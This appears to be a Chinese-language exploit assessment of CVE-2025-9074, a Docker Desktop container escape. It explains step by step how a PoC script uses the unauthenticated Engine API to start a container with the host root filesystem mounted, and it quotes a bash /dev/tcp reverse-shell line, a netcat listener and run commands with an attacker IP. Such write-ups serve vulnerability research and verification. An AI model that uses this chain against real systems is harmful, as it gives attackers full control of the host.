## CVE-2025-9074 - Docker Desktop 容器逃逸, 权限提升

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸, 权限提升

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** 影响Docker Desktop 4.44.3版本之前的所有版本

**利用条件:** 本地运行的恶意Linux容器访问未认证的Docker Engine API

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个在Docker Desktop应用程序中发现的严重安全漏洞，其影响范围覆盖Windows和macOS平台。该漏洞允许在受影响系统上运行的恶意Linux容器突破其固有的隔离沙箱环境，通过未认证的方式直接访问并利用宿主机上的Docker Engine API。这种未经授权的访问最终可能导致攻击者完全接管宿主机系统，造成严重的权限提升后果。

提供的POC脚本`CVE-2025-9074.sh`是一个高度有效且功能完整的shell脚本，它精确地演示了如何利用这一漏洞。该脚本利用的核心机制是Docker Engine API在默认配置下（通常在`192.168.65.7:2375`地址上监听）无需任何认证即可从本地网络（即从受损的容器内部）进行访问的缺陷。攻击者首先需要已经设法在目标Docker Desktop实例上成功运行了一个恶意或受控的Linux容器。一旦恶意容器被启动并获得执行脚本的权限，`CVE-2025-9074.sh`脚本便可被执行。

脚本的执行流程如下：
1.  **信息收集**: 脚本首先利用`curl`工具向Docker Engine API的`/images/json`端点发送一个HTTP GET请求。此举旨在获取一个可用于后续操作的现有Docker镜像的名称。选择一个已存在的镜像可以确保容器的创建过程顺利进行。
2.  **Payload构造**: 脚本随后会精心构造一个JSON格式的payload。这个payload是漏洞利用成功的关键。它包含以下两个核心部分：
    *   **反向Shell命令**: 在`Cmd`字段中，脚本嵌入了一个反向shell命令：`bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1`。这个命令的目的是在新创建的容器启动时，立即在容器内部执行一个Bash交互式shell，并将其标准输入、输出和错误流重定向到攻击者预先设置的远程监听器 (`LHOST:LPORT`)。这是获取远程控制权的直接方式。
    *   **宿主机文件系统挂载**: 在`HostConfig.Binds`字段中，脚本尝试将宿主机的根文件系统（在Windows系统上通常是`c:`盘的根目录，而在Linux或macOS系统上则是`/`根目录）通过绑定挂载（bind mount）的方式挂载到新创建的容器内部。例如，`/mnt/host/c:/host_root_win`用于Windows宿主机，`/:/host_root_nix`用于类Unix宿主机。这意味着一旦新容器启动，攻击者不仅会通过反向shell获得远程命令执行能力，还将直接拥有对宿主机完整文件系统的读写访问权限，从而实现了彻底的权限提升和容器逃逸。
3.  **容器创建与启动**: 最后，脚本将构造好的JSON payload通过`curl`工具发送到Docker Engine API的`/containers/create`端点，请求创建一个新的容器。一旦容器创建成功并返回其ID，脚本会立即向`/containers/${ID}/start`端点发送一个HTTP POST请求来启动该容器。

一旦恶意容器成功启动，其内部的反向shell命令将被激活，并尝试连接到攻击者在`LHOST:LPORT`上监听的服务器。当连接建立后，攻击者便获得了宿主机的root权限（在Linux/macOS上）或System权限（在Windows上，通过挂载点可以进一步操作）。POC脚本的实现逻辑清晰，代码可读性强，并提供了详细的命令行参数用法说明以及所需的依赖项（`bash`和`curl`），这使得它成为一个非常高质量的漏洞利用工具，可以直接用于漏洞的验证和复现。

**利用步骤**:
1.  **前提条件检查**: 确保目标Docker Desktop环境存在漏洞（版本低于4.44.3），且攻击者已成功在目标系统上运行了一个恶意的Linux容器。
2.  **攻击者端监听设置**: 在攻击者控制的远程机器上，启动一个网络监听器，用于接收反向shell连接。例如，使用Netcat：`nc -lvnp <LPORT>`。举例：`nc -lvnp 9002`。
3.  **POC脚本部署**: 将`CVE-2025-9074.sh`脚本传输到已在目标系统上运行的恶意Linux容器内部的文件系统。
4.  **POC脚本执行**: 在恶意容器的命令行界面中执行该脚本。执行时需提供Docker Engine API的IP地址和端口（通常默认为`192.168.65.7`和`2375`），以及攻击者机器的IP地址（`LHOST`）和之前设置的监听端口（`LPORT`）。
    *   示例命令：`sh CVE-2025-9074.sh 192.168.65.7 2375 <攻击者IP> <攻击者监听端口>`
    *   具体例子：`sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`
5.  **反向Shell建立**: 脚本执行后，它将通过未认证的Docker Engine API在宿主机上创建并启动一个新的恶意容器。这个新容器随即执行其内嵌的反向shell命令，尝试连接回攻击者机器上的监听器。
6.  **宿主机控制权获取**: 攻击者在监听器上将收到来自宿主机的反向shell连接。此时，攻击者已成功获得宿主机的root/System权限，并可通过之前挂载的宿主机根目录访问其文件系统，从而实现对宿主机的完全控制。

**投毒风险分析**:
针对所提供的`CVE-2025-9074.sh`POC脚本进行深入分析后，可以判定其投毒风险极低，评估为10%。这一评估基于以下几个关键因素：
首先，脚本的代码是完全透明和开源的，没有任何混淆、加密或意图隐藏真实意图的迹象。所有的操作和逻辑都直接呈现在脚本中，易于任何具备基本shell脚本知识的安全研究人员进行审查和理解。
其次，脚本仅依赖于标准的Linux/macOS系统工具，如`curl`和`bash`。它不包含任何外部资源引用、可疑的下载链接、隐藏的二进制文件或与非标准库的链接。所有的功能实现都局限于脚本本身的执行环境，没有引入任何可能引入额外风险的第三方组件。
第三，脚本的核心功能是利用Docker Engine API创建并启动一个带有反向shell命令的容器。反向shell本身是漏洞成功利用后用来获取远程命令执行的合法Payload，而非脚本作者额外植入的恶意负载。这种技术是安全研究和漏洞演示中普遍接受和使用的方法，旨在清晰地展示漏洞的潜在影响和利用效果。
最后，该脚本没有表现出任何其他典型的恶意行为模式，例如进行数据窃取、持久化、传播自身或干扰系统正常运行等。其设计目的明确，即为安全研究和漏洞验证提供一个可重现的利用途径。
综上所述，该POC脚本被认为是一个纯粹用于防御性安全研究和漏洞复现的工具，其代码质量高，行为可预测，不包含任何恶意投毒成分，用户可以安全地使用它来验证CVE-2025-9074漏洞的存在及其潜在影响。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
